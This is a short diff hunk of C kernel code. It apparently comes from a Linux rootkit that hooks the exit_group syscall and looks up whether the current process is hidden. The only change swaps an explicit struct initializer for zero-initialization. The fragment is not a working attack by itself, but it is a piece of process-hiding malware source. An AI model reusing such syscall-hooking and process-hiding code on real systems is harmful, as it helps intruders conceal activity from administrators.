@@ -66,7 +66,7 @@ static DEFINE_SPINLOCK(hide_once_spin);
 static asmlinkage long m_exit_group(struct pt_regs *regs)
 {
 	long rc = 0L;
-	struct hidden_status status = { .hidden = false, .saddr = 0 };
+	struct hidden_status status = { 0 };
 
 	/** load the status of PID */
 	if (!kv_find_hidden_pid(&status, current->pid))
